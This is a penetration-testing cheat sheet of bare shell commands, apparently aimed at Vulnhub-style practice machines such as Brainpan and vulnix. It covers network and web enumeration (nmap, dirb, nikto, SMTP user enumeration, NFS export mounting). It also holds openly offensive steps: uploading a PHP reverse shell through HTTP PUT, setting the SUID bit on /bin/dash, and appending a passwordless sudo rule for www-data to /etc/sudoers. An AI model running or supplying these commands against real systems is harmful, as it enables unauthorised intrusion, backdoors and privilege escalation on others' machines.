arp-scan -I eth0 --srcaddr=DE:AD:BE:EF:CA:BA <ip>/24
nmap -sC sV <ip> -oA nmap/<ip>
nmap -sC -sV -p 80 --script "http-*" <ip>
apt-get install cewl -y
dirb http://<ip>/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X php,html,sh -o dirb.txt -w
cewl http://<site> > list.txt
nikto -h <ip> -o nikto.txt

curl -v -X OPTIONS http://<ip>
nmap -p80 <ip> --script http-put --script-args http-put.url='/test/php-reverse-shell.php',http-put.file='php-reverse-shell.php'

python -m SimpleHTTPServer 8000
chmod u+s /bin/dash

tesseract blow.jpg output --oem 1 -l eng

cd /opt
git clone https://github.com/codingo/Reconnoitre.git
git clone https://github.com/danielmiessler/SecLists.git
cd Reconnoitre
python setup.py install
reconnoitre -t <ip> -o /root/Documents/Vulnhub/Brainpan/reconnoitre/ --services

chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers

apt-get install iotop iftop htop fatrace wavemon -y

#NFS
rpcinfo -p <ip>
nmap -sU -sT -p 2049 <ip>
apt-get install nfs-common -y
showmount --exports 172.25.113.65
mkdir /tmp/nfs
mount -t nfs 192.168.1.33:/home/vulnix /tmp/nfs
cd /tmp/nfs

smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t <ip>
